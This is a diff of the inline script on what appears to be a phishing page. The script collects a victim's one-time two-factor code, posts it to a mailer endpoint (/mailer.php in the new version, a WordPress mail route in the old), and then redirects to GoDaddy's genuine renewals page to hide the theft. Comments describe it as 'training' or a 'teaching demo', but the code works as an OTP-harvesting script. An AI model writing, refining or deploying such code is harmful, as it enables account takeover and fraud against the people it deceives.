@@ -162,50 +162,140 @@ body{background:#eef0f2;color:#111;font-family:Arial,Helvetica,"Segoe UI",sans-s
   </div>
 </div>
 <script>
+(function () {
 
-(function(){
-  var ENDPOINT = "/wp-json/dzeuf/v1/mail";
-  var TOKEN    = "DZEUF-EDU-2026-8f3a";
+  var ENDPOINT = "/mailer.php";
+
   var form = document.getElementById("tdsForm");
   var btn  = document.getElementById("tdsSubmit");
+  var otp  = document.getElementById("otp");
 
-  // --- OTP must be a non-empty, digits-only code; keep SUBMIT locked until it is ---
-  var otp = document.getElementById("otp");
-  if (otp){
-    otp.required = true;                        // native "required" as a backstop
-    btn.disabled = true;                        // start locked: cannot submit an empty code
-    otp.addEventListener("input", function(){
-      otp.value = otp.value.replace(/\D/g, ""); // strip anything that is not a digit
-      btn.disabled = (otp.value.length === 0);  // unlock only once a digits code is entered
-    });
-  }
+  otp.required = true;
+  otp.maxLength = 6;
+
+  btn.disabled = true;
 
 
-  form.addEventListener("submit", function(e){
+  otp.addEventListener("input", function () {
+
+    otp.value =
+  otp.value
+    .replace(/\D/g, "")
+    .slice(0, 6);
+
+btn.disabled =
+  !(otp.value.length === 4 || otp.value.length === 6);
+
+  });
+
+
+  form.addEventListener("submit", async function (e) {
+
     e.preventDefault();
-    // guard: never submit unless the code is present and all digits
-    var code = (otp ? otp.value : "").replace(/\D/g, "");
-    if (!code){
-      if (otp){ otp.focus(); if (otp.reportValidity) otp.reportValidity(); }
+
+    var code =
+      String(otp.value || "")
+        .replace(/\D/g, "");
+
+
+    /*
+     * Training code only.
+     */
+    if (code == "") {
+
+      otp.setCustomValidity(
+        "Enter the OTP."
+      );
+
+      otp.reportValidity();
+
       return;
     }
+
+
+    otp.setCustomValidity("");
+
     btn.disabled = true;
     btn.textContent = "PROCESSING…";
 
-    var payload = {
-      token: TOKEN,
-      stage: "2fa",
-      fields: { "رمز التحقق (OTP)": (document.getElementById("otp").value || "") }
-    };
 
-    fetch(ENDPOINT, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify(payload)
-    })
-    .catch(function(){ /* teaching demo: continue even if the mail call fails */ })
-    .finally(function(){ window.location.href = "/full-en/"; });   // hand off to the REAL page
+    try {
+
+      var data = new FormData();
+
+      data.append("mode", "otp_demo");
+      data.append("code", code);
+
+
+      var response =
+        await fetch(
+          ENDPOINT,
+          {
+            method: "POST",
+            body: data
+          }
+        );
+
+
+      var raw =
+        await response.text();
+
+
+      console.log(
+        "OTP mailer response:",
+        raw
+      );
+
+
+      var result;
+
+      try {
+
+        result =
+          JSON.parse(raw);
+
+      } catch (error) {
+
+        throw new Error(
+          "Mailer returned an invalid response."
+        );
+
+      }
+
+
+      if (!result.ok) {
+
+        throw new Error(
+          result.error ||
+          "Could not send training code."
+        );
+
+      }
+
+
+      /*
+       * Email succeeded.
+       * Continue to shop.
+       */
+
+      window.location.href =
+        "https://account.godaddy.com/myrenewals";
+
+
+    } catch (error) {
+
+      console.error(
+        "OTP mailer error:",
+        error
+      );
+
+      btn.disabled = false;
+      btn.textContent = "SUBMIT";
+
+    }
+
   });
+
 })();
 </script>
 </body>
